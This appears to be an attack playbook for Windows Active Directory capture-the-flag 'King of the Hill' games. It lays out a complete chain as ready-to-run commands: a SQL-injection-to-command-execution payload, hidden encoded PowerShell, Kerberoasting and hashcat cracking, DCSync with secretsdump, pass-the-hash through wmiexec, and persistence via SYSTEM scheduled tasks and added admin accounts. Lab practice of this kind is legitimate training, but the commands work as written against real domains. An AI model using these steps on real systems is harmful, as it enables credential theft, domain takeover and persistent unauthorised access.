# Windows / AD playbook (medium boxes)

Purpose: cut the avoidable time on Windows AD KotH. Chain: web RCE → kerberoast →
crack → DCSync → exec → hold. Each phase has a bounded recipe.

## 0. Fingerprint
```sh
nmap -Pn -n -p 80,81,82,88,135,139,389,445,464,593,636,3268,3389,9389,9999 --version-light TARGET
curl -s -m5 http://TARGET:9999/            # KotH checker (king file contents)
```
Windows + AD: 88/389/445/464/636/3268 → domain controller. Get the domain from
`:389` or `nmap -p389 --script ldap-rootdse`.

## 1. Web foothold
- SQLi → stacked/UNION → command execution in a `ping`-style endpoint:
  ```sh
  q="1000 union select 1,'127.0.0.1 >nul & whoami'-- -"
  curl -s -G --data-urlencode "id=$q" http://TARGET:81/ping
  ```
- Keep a one-file runner (`run.sh`) that URL-encodes the payload and prints the
  JSON `result`; rewriting quoting each time costs minutes. Prefer `>nul &` over
  `;`/`|` when the parameter is filtered.

## 2. Script/file channel (the usual time sink)
Order of preference:
1. **SMB** if 445 is open: `smbclient //TARGET/C$ -U 'DOMAIN/user%pass' -c 'put x.ps1 x.ps1'`.
2. **PowerShell one-shot** (no file needed):
   ```sh
   b64=$(printf '%s' 'whoami; hostname' | iconv -f utf-8 -t utf-16le | base64 -w0)
   # via web RCE: powershell -nop -w hidden -enc <b64>
   ```
   `-enc` avoids quoting hell.
3. **iwr -UseBasicParsing** to your HTTP server (works when certutil is blocked by
   the WinHTTP proxy: `certutil` → error 12004).
4. Avoid repeated `iex (iwr ...)` when you need output: write to a file in the
   webroot, then fetch it over HTTP (`curl http://TARGET:81/out.txt`).

## 3. Kerberoast
```powershell
# minimal SPN roast (no PowerView dependency)
Add-Type -AssemblyName System.IdentityModel
$t = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "TIME/TROY-DC.TROY.THM"
$t.RequestSecurityToken() | Out-Null
$t.GetRequestedSecurityToken().GetBase64String()   # save as .kirbi
```
Convert and crack:
```sh
kirbi2john ticket.kirbi > tgs.hash || python3 - <<'PY'   # fallback: impacket ASN.1
import binascii; d=open('ticket.kirbi','rb').read()
print('$krb5tgs$23$*user$DOMAIN$spn*$' + binascii.hexlify(d[:16]).decode() + '$' + binascii.hexlify(d[16:]).decode())
PY
hashcat -m 13100 tgs.hash rockyou.txt --force -O -w 3
```
Note: `-m 13100` needs the `$krb5tgs$` format, not raw DER — that is the usual
"hashcat finds nothing" trap.

## 4. Domain escalation
```sh
secretsdump.py 'DOMAIN/user:pass@TARGET' -just-dc-user Administrator -no-pass
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NT> 'DOMAIN/Administrator@TARGET' 'whoami'
```
If DCSync is denied, check replication rights (`ACL`), or use `-just-dc-ntlm`.

## 5. Hold (Windows)
- King path from the checker; write exact bytes without newline:
  `Set-Content C:\king.txt -Value 'NAME' -NoNewline -Force`.
- Guard: PS loop (2 s) + Scheduled Task as SYSTEM, script outside `Temp`
  (e.g. `C:\ProgramData\Microsoft\guard.ps1`), plus a second task as backup.
- ACL the king file: Administrators/SYSTEM full, Users read.
- Persistence: local admin user or domain account; verify with a fresh logon.
- Do **not** report "held" until a tamper test restores the exact bytes.

## 6. Verification gotchas
- A file readable by the web-RCE user may be **denied to Administrator** (explicit
  ACL). Verify flags as the user who owns them, not only as DA.
- `type` via cmd is more reliable than `Get-Content` for small flag files.
- Long `wmiexec` commands hit your `timeout`: run work detached (`start /b`) and
  poll the output file instead of raising the timeout.
